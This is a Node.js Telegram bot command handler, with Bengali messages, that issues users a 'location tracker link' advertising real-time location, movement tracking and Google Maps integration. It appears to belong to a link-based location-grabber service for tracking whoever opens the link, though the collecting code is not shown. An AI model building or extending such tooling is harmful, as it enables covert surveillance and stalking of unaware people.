const authMiddleware = require('../middlewares/auth');
const rateLimiter = require('../middlewares/rateLimiter');
const generator = require('../utils/generator');

module.exports = async (bot, msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  
  try {
    const auth = await authMiddleware(msg);
    if (!auth.allowed) {
      return bot.sendMessage(chatId, 'অ্যাক্সেস দেওয়া হয়নি। আগে /start দিন এবং অনুমোদনের জন্য অপেক্ষা করুন।');
    }
    
    const rateLimit = rateLimiter(userId);
    if (!rateLimit.allowed) {
      return bot.sendMessage(chatId, 'অনেক বেশি অনুরোধ পাঠানো হয়েছে। এক মিনিট পরে আবার চেষ্টা করুন।');
    }
    
    const link = await generator.generateLocationLink(userId);
    
    auth.user.totalLinks += 1;
    await auth.user.save();
    
    const message = `✅ 𝐋𝐎𝐂𝐀𝐓𝐈𝐎𝐍 𝐓𝐑𝐀𝐂𝐊𝐄𝐑 𝐋𝐈𝐍𝐊\n\n` +
      `🔗 আপনার লিঙ্ক:\n${link.url}\n\n` +
      `📍 ফিচার:\n` +
      `• রিয়েল-টাইম লোকেশন\n` +
      `• গুগল ম্যাপ ইন্টিগ্রেশন\n` +
      `• মুভমেন্ট ট্র্যাকিং\n` +
      `• এসিুরেসি লেভেল\n\n` +
      `⏰ এক্সপায়ার: ৭ দিন`;
    
    await bot.sendMessage(chatId, message);
    
  } catch (error) {
    console.error('Location Command Error:', error);
    await bot.sendMessage(chatId, 'লিংক তৈরি করতে সমস্যা হয়েছে। একটু পরে আবার চেষ্টা করুন।');
  }
};
